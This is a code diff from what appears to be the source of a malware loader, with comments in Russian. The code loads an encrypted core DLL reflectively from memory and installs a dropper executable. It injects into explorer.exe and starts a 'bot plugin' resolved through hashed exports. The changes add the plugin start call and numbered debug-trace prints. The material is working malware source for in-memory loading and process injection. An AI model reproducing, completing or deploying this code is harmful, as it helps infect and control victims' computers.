@@ -7,6 +7,7 @@
 #include "Source\LoaderUtils.h"
 
 #include "CoreDllDef.h"
+#include "GetApi.h"
 
 
 
@@ -27,10 +28,17 @@ namespace CoreDll
 //---------------------------------------------------------------------
 void StartBotPlug(LPVOID Buf)
 {
-	LPVOID Handle = MemoryLoadLibrary(Buf);
+	LPVOID Handle = MemoryLoadLibrary(Buf,  false);
 	if (Handle)
 	{
-		OutputDebugStringA("-------------------------------------Плагин запущен");
+		typedef void (WINAPI *TStart)(LPVOID, LPVOID, LPVOID);
+		#define HASH_START 0x3E987971 /* Start */
+		TStart Start = (TStart)MemoryGetProcAddress(Handle, HASH_START);
+		if (Start)
+		{
+			Start(NULL, NULL, NULL);
+			OutputDebugStringA("-------------------------------------Плагин запущен");
+		}
 	}
 }
 
@@ -43,15 +51,19 @@ void StartBotPlug(LPVOID Buf)
 DWORD WINAPI ExplorerMainProc(LPVOID)
 {
 	// Загружаем dll 
+	InitializeAPI();
+	pOutputDebugStringA("1");
 	LPVOID Handle = MemoryLoadEncryptedLibrary(CoreDll::data);
-
+OutputDebugStringA("2");
 	// Этап первый. Инсталируем ехе
 	TInstall Install = (TInstall)MemoryGetProcAddress(Handle, COREDLL_INSTALL);
+	OutputDebugStringA("3");
 	if (Install)
 	{
+		OutputDebugStringA("4");
 		Install(DropperName, FALSE, TRUE, DropperPID); 
 	}
-	
+	OutputDebugStringA("5");
 	// Загружаем плагин
 	TLoadBotPlug LoadBP = (TLoadBotPlug)MemoryGetProcAddress(Handle, COREDLL_LOADBOTPLUG);
 	TFreeBotPlug FreeBP = (TFreeBotPlug)MemoryGetProcAddress(Handle, COREDLL_FREEBOTPLUG);
@@ -60,15 +72,19 @@ DWORD WINAPI ExplorerMainProc(LPVOID)
 	DWORD  Size;
 	if (LoadBP  && LoadBP(&PlugBuf, &Size))
 	{
+		OutputDebugStringA("6");
 		StartBotPlug(PlugBuf);
+		OutputDebugStringA("7");
 
 		if (FreeBP) FreeBP(PlugBuf);
 	}
 
 
-
+ OutputDebugStringA("8");
 	// Выгружаем длл ядра
 	MemoryFreeLibrary(Handle);
+
+	OutputDebugStringA("9");
 
 	return 0;
 }
@@ -90,12 +106,12 @@ int APIENTRY LoaderMain()
 	LPVOID Handle = MemoryLoadEncryptedLibrary(CoreDll::data);
 
 	LPVOID Proc = MemoryGetProcAddress(Handle, COREDLL_INJECTINTOEXPLORER);
-
 	// Инжектимя в explorer.exe
 	if (Proc)
+	{
 		(TInjectIntoExplorer(Proc))(ExplorerMainProc);
+	}
 	
-
 	MemoryFreeLibrary(Handle);
 
 
